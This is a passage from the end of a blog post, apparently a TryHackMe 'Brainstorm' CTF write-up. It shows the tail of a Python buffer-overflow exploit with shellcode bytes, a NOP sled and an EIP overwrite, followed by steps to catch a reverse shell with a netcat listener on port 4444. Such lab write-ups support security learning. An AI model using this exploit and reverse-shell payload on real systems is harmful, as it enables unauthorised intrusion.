<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x93\x91\x8e\xe2\x79\xba\x25\x19\xea\x05\x11\x21\x8d</span><span class="s2">&#34;</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xed\x60\x21\x40\xb2\xed\xc7\x08\x5a\xb8\x50\xa5\xc3</span><span class="s2">&#34;</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xe1\x2a\x54\x0b\x3c\x57\x56\x87\xb3\xa8\x19\x60\xb9</span><span class="s2">&#34;</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xba\xce\x80\xf4\xe0\x59\x9e\x22\x8c\x06\x0d\xa9\x4c</span><span class="s2">&#34;</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x40\x2e\x66\x1b\x05\x80\x7f\xc9\xbb\xbb\x29\xef\x41</span><span class="s2">&#34;</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x5d\x11\xab\x9d\x9e\x9c\x32\x53\x9a\xba\x24\xad\x23</span><span class="s2">&#34;</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x87\x10\x61\x72\x51\xce\xc7\x2c\x13\xb8\x91\x83\xfd</span><span class="s2">&#34;</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x2c\x67\xe8\x3d\x2a\x68\x25\xc8\xd2\xd9\x90\x8d\xed</span><span class="s2">&#34;</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xd6\x74\x1a\x96\x0a\xe5\xe5\x4d\x8f\x15\xac\xcf\xa6</span><span class="s2">&#34;</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xbd\x69\x9a\xfa\xa3\x89\x71\x38\xda\x09\x73\xc1\x19</span><span class="s2">&#34;</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x11\xf6\xc4\x66\x95\xeb\xb4\xf7\x70\x0b\x6a\xf7\x50</span><span class="s2">&#34;</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="n">buf</span>
<span class="n">NOP_sled</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">15</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="n">total_length</span> <span class="o">=</span> <span class="mi">4088</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mi">2012</span>
<span class="n">buffer</span> <span class="o">=</span> <span class="p">[</span>
<span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">,</span>
<span class="n">new_eip</span><span class="p">,</span>
<span class="n">NOP_sled</span><span class="p">,</span>
<span class="n">shellcode</span><span class="p">,</span>
<span class="sa">b</span><span class="s2">&#34;C&#34;</span> <span class="o">*</span><span class="p">(</span><span class="n">total_length</span> <span class="o">-</span> <span class="n">offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">new_eip</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
<span class="p">]</span>
<span class="n">buffer</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
</code></pre></div><p>Set up a netcat listener on our local machine listening on port 4444, send the payload.</p>
<p>We get a reverse shell</p>
<p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/posts/2021-03-28_tryhackme-brainstorm/images/26.png#layoutTextWidth" alt="image" />
      
    </figure>
  

</p>
<h3 id="getting-the-flag" class="relative group">Getting the flag <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#getting-the-flag" aria-label="Anchor">#</a></span></h3>
<p>Here we simply modify our target IP on the script to that of the remote IP in tryhackme.</p>
<p>Don‚Äôt forget to generate a new payload with the IP of your tun0 interface.</p>
<p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/posts/2021-03-28_tryhackme-brainstorm/images/27.png#layoutTextWidth" alt="image" />
      
    </figure>
  

</p>
<p>We get access to the machine. Navigate your way to finding the flag.</p>
<p>Happy hacking :)</p>

      </div>
    </section>
    <footer class="pt-8 max-w-prose print:hidden">
      

      

      
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
      <div class="flex justify-between pt-3">
        <span>
          
            <a class="flex group" href="/posts/2021-03-23_rce-on-unauthenticated-redis-server/">
              <span
                class="mr-3 ltr:inline rtl:hidden text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400"
                >&larr;</span
              >
              <span
                class="ml-3 ltr:hidden rtl:inline text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >RCE on Unauthenticated Redis server</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2021-03-23 18:02:12.222 &#43;0000 UTC">23 March 2021</time>
                  
                </span>
              </span>
            </a>
          
        </span>
        <span>
          
            <a class="flex text-right group" href="/posts/2021-04-01_binextryhackme/">
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >Binex-Tryhackme</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2021-04-01 18:50:44.566 &#43;0000 UTC">1 April 2021</time>
                  
                </span>
              </span>
              <span
                class="ml-3 ltr:inline rtl:hidden text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span
                class="mr-3 ltr:hidden rtl:inline text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400"
                >&larr;</span
              >
            </a>
          
        </span>
      </div>
    </div>
  


    </footer>
    
  </article>

        
          <div
            class="absolute top-[110vh] ltr:right-0 rtl:left-0 w-12 pointer-events-none bottom-0"
          >
            <a
              href="#the-top"
              class="w-12 h-12 sticky pointer-events-auto top-[calc(100vh-5.5rem)] bg-neutral/50 dark:bg-neutral-800/50 backdrop-blur rounded-full text-xl flex items-center justify-center text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400"
              aria-label="Scroll to top"
              title="Scroll to top"
            >
              &uarr;
            </a>
          </div>
        
      </main>
      <div
  id="search-wrapper"
  class="fixed inset-0 z-50 flex flex-col p-4 sm:p-6 md:p-[10vh] lg:p-[12vh] w-screen h-screen cursor-default bg-neutral-500/50 backdrop-blur-sm dark:bg-neutral-900/50 invisible"
  data-url="https://trevorsaudi.com/"
>
  <div
    id="search-modal"
    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg border-neutral-200 top-20 bg-neutral dark:bg-neutral-800 dark:border-neutral-700"
  >
    <header class="relative z-10 flex items-center justify-between flex-none px-2">
      <form class="flex items-center flex-auto min-w-0">
        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
          

  <span class="relative inline-block align-text-bottom icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


        </div>
        <input
          type="search"
          id="search-query"
          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-transparent focus:outline-2"
          placeholder="Search"
          tabindex="0"
        />
      </form>
      <button
        id="close-search-button"
        class="flex items-center justify-center w-8 h-8 text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400"
        title="Close (Esc)"
      >
        

  <span class="relative inline-block align-text-bottom icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>


      </button>
    </header>
    <section class="flex-auto px-2 overflow-auto">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>
<footer class="py-10 print:hidden">
  
  
  <div class="flex justify-between">
    <div>
      
      <p class="text-sm text-neutral-500 dark:text-neutral-400">
          üòÑ
      </p>
      
      
        <p class="text-xs text-neutral-500 dark:text-neutral-400">
          
          
          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://git.io/hugo-congo" target="_blank" rel="noopener noreferrer">Congo</a>
        </p>
      
    </div>
    
    
      <div
        class="text-sm cursor-pointer text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-14 rtl:ml-14"
      >
        <button
          id="appearance-switcher"
          class="w-12 h-12 "
          type="button"
          title="Switch to dark appearance"
        >
          <span class="inline dark:hidden">

  <span class="relative inline-block align-text-bottom icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>

</span>
          <span class="hidden dark:inline">

  <span class="relative inline-block align-text-bottom icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>

</span>
        </button>
      </div>
    
  </div>
  
  
</footer>
</div>
  </body>
</html>
